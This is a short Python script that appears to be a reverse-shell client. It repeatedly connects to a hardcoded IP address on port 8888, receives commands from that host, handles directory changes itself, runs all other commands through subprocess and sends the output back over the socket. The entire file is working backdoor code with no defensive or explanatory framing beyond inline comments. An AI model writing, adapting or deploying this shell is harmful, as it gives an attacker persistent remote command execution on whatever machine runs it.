import socket, time, subprocess, os

host_ip = '172.25.165.15'    #host server ip
port_number = 8888   #must match the port opened via server
ADRRESS = (host_ip,port_number)    #tuple address

while True:

    while True:   #repeatedly tries to connect
        time.sleep(3)   #waits 3 secs before trying again
        try:
            CLIENT_SOCKET = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    #creates socket object
            CLIENT_SOCKET.connect(ADRRESS)     #attempts one connection to host server address
            break

        except:
            continue


    while True:

        RECIEVED_CMD = CLIENT_SOCKET.recv(5008).decode('utf-8')  #recieves and decodes byte

        if RECIEVED_CMD == 'CLOSE_CONNECTION':  #handles quit connection
            break
            
        elif RECIEVED_CMD[0:2] == 'cd':  #if the first two characters are "cd" handles change directory

            os.chdir(f'{RECIEVED_CMD[3:]}') #executes change directory
            REPLY = f"cd: {os.getcwd()}" #reply message = new directory

            BufferSize = len((REPLY).encode('utf-8'))  #dynamic buffer size message
            CLIENT_SOCKET.send(bytes(str(BufferSize),'utf-8'))

            time.sleep(0.5) #waits 0.5 seconds to send the actual result
            CLIENT_SOCKET.send(bytes(REPLY, 'utf-8'))    #sends actual result


            #executing cmd and sending results
        else:
            REPLY = subprocess.getoutput(RECIEVED_CMD)
            
            BufferSize = len((REPLY).encode('utf-8'))  #sends size of byte for dynamic buffer server end
            CLIENT_SOCKET.send(bytes(str(BufferSize),'utf-8'))

            time.sleep(0.5) #waits 0.5 seconds to send the actual result
            CLIENT_SOCKET.send(bytes(REPLY, 'utf-8'))    #sends actual results
